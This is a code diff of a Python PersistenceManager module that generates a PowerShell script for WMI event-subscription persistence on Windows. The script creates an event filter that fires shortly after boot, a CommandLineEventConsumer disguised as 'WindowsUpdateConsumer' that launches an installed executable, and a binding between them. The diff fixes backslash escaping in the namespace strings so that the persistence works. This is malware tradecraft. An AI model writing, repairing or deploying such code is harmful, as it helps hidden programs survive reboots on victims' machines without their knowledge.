@@ -9,7 +9,6 @@ import shutil
 import subprocess
 import winreg as reg
 import ctypes
-from pathlib import Path
 
 
 class PersistenceManager:
@@ -166,21 +165,21 @@ $consumerName = "WindowsUpdateConsumer"
 $exePath = "{self.install_path}"
 
 # Crear event filter (ejecutar al iniciar Windows)
-$filterPath = Set-WmiObject -Class __EventFilter -Namespace "root\subscription" -Arguments @{{
+$filterPath = Set-WmiObject -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
     Name = $filterName
-    EventNamespace = "root\cimv2"
+    EventNamespace = "root\\cimv2"
     QueryLanguage = "WQL"
     Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320"
 }}
 
 # Crear event consumer
-$consumerPath = Set-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{{
+$consumerPath = Set-WmiObject -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
     Name = $consumerName
     CommandLineTemplate = $exePath
 }}
 
 # Vincular filter y consumer
-Set-WmiObject -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{{
+Set-WmiObject -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
     Filter = $filterPath
     Consumer = $consumerPath
 }}
